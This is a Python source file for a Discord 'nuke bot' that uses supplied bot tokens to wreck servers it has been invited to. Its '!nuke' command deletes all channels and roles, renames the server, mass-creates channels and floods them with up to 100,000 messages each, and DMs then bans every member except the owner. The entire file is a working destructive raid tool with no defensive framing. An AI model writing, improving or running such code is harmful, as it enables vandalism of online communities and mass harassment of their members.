import asyncio
import discord
from discord.ext import commands
import time
import base64
import random
import secrets

# config
channel_name = ""
server_name = ""
role_name = ""
admin_message = ""
ban_reason = ""
dm_message = ""
channel_message = ""


# PUT TOKENS HERE, SEPERATE ENTRIES BY A NEW LINE AND COMMA. GET TOKENS FROM THE DISCORD DEVELOPER PORTAL
TOKENS = [
    "token",
]

name_of_icon = "NukeBotImage.png"

badmembers = []

def create_bot():
    global channel_name, server_name, role_name, admin_message, ban_reason, dm_message, channel_message
    
    channelname = channel_name
    botversion = "1.0.6"
    guild_name = server_name
    ban_message = ban_reason

    bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        app_info = await bot.application_info()
        owner = app_info.owner
        print(f"Current Bot Administrator: {owner}")
        admin_id = owner.id
        print(admin_message)
        print("\nTHE BOT IS CURRENTLY IN THE FOLLOWING SERVERS:")
        print(f"BOT INVITE LINK: https://discord.com/oauth2/authorize?client_id={bot.application_id}&scope=bot+applications.commands&permissions=8")
        for guild in bot.guilds:
            print(f"{guild.name} (SERVER ID: {guild.id})")
        admin_user = await bot.fetch_user(admin_id)
        try:
            await admin_user.send(admin_message)
        except Exception as e:
            print(f"Could not DM admin user: {e}")


    @bot.command()
    async def nuke(ctx):
        nuke_start_time = time.time()
        print(f"Nuking {ctx.guild.name}.")
        server_name = ctx.guild.name
        async def memberstask(server):
            for member in server.members:
                try:
                    await member.send(dm_message)
                    print(f"DM'd {member.name}")
                    global badmembers
                    badmembers.append(member.id)
                    try:
                        app_info = await bot.application_info()
                        if member.id == app_info.owner.id:
                            print("Encountered ", {member})
                            print("Skipping.")
                            continue
                        else:
                            await member.ban(reason=ban_message)
                            print(f"Banned {member.name}")
                    except Exception as e:
                        print(f"Could not ban {member.name}: {e}")
                except Exception as e:
                    print(f"Could not DM {member.name}: {e}")
            
            print(f"The illegal user ids are as follows: {badmembers}")

        async def servertask(server):
            await server.edit(name=guild_name)
            print(f"Changed server name to {guild_name}")
            try:
                with open(name_of_icon, "br") as f:
                    image = f.read()
                await server.edit(icon=image)
                print("Changed server icon")
            except Exception as e:
                print(f"Failed to update server icon: {e}")

        async def channeltask(server):
            for channel in server.channels:
                try:
                    await channel.delete()
                    print(f"Deleted channel {channel.name}")
                except Exception as e:
                    print(f"Could not delete channel {channel.name}: {e}")
            nonlocal channels
            for i in range(50):
                try:
                    channel = await server.create_text_channel(channelname)
                    channels.append(channel.id)
                    print(f"Created channel {channel.name}")
                except Exception as e:
                    print(f"Could not create channel #{i+1}: {e}")
            
        async def rolestask(server):
            for role in server.roles:
                try:
                    await role.delete()
                    print(f"Deleted role {role.name}")
                except Exception as e:
                    print(f"Could not delete role {role.name}: {e}")
            for i in range(5):
                try:
                    await server.create_role(name=role_name)
                    print(f"Created role {role_name}")
                except Exception as e:
                    print(f"Could not create role #{i+1}: {e}")
                    
        channels = []
        await asyncio.gather(channeltask(ctx.guild), servertask(ctx.guild))

        prep_time = time.time() - nuke_start_time
        print(f"Prep complete. Prep took {prep_time} seconds.")

        async def send_messages(channel):
            for _ in range(100000):
                try:
                    await channel.send(channel_message)
                except Exception as e:
                    print(f"Could not send message in {channel.name if channel else 'unknown'}: {e}")
                    break

        tasks = []
        for channel_id in channels:
            channel = bot.get_channel(channel_id)
            if channel:
                tasks.append(send_messages(channel))
            else:
                print(f"Could not find channel with ID {channel_id}")

        tasks.append(rolestask(ctx.guild))
        tasks.append(memberstask(ctx.guild))

        await asyncio.gather(*tasks)
        
    return bot

async def run_bot(token):
    bot = create_bot()
    try:
        await bot.start(token)
    except Exception as e:
        print(f"Bot with token {token[:10]}... crashed: {e}")

async def main():
    await asyncio.gather(*[run_bot(token) for token in TOKENS])

asyncio.run(main())